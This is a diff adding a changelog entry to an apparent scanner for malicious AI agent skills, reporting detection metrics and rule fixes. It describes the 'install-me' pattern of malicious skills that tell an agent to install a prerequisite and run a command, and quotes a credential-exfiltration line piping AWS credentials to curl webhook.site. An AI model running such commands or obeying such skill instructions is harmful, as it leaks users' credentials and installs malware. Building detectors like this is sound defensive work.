@@ -1,5 +1,34 @@
 # Changelog
 
+## 0.11.0
+
+Measured on a 500-skill real-world corpus (50 ClawHavoc, 400 clean ClawHub, 50
+hard negatives), F1 goes from 0.000 to 0.828 and recall from 0.000 to 0.960 at
+the shipped threshold, with no API key and no LLM. The 101-skill in-text corpus
+is unchanged at F1 0.943. Four of these are bug fixes, not tuning.
+
+- Detection: the install-me envelope is now its own finding. A skill that tells
+  you to install a prerequisite and run a command, with the payload in a
+  referenced file rather than SKILL.md, is the shape of real ClawHavoc skills.
+  Each half is medium severity, so the pair used to top out at 24 and never
+  reach the warn band. The pair fires on 48 of 50 real malicious skills and 0 of
+  450 benign ones.
+- Detection: credential reads and outbound sends in the same skill now raise a
+  critical "Credential exfiltration" finding. `cat ~/.aws/credentials | curl
+  webhook.site` previously scored 23 and was recommended for approval.
+- Fix: a shell variable the skill assigns itself is no longer reported as an
+  undeclared env var. Every `RESULT=$(...)` in a code block was being counted as
+  an environment dependency, which buried the real ones.
+- Fix: the credential-file rule matched `process.env` and the English word
+  "credentials". Those were the top two false-positive sources on real skills,
+  207 and 152 hits across the benign set. It now requires real path context.
+- Scoring: metadata findings (undeclared binaries and env vars, missing
+  description) no longer contribute to the risk score. A skill using eight
+  ordinary unix tools was collecting 24 points for incomplete frontmatter. They
+  are still reported as hygiene.
+- Docs: the SKILL.md description now states when to invoke the skill rather than
+  what it does, so an agent can route on it.
+
 ## 0.10.0
 
 - Scoring: repeated matches of the same rule on the same evidence now count with
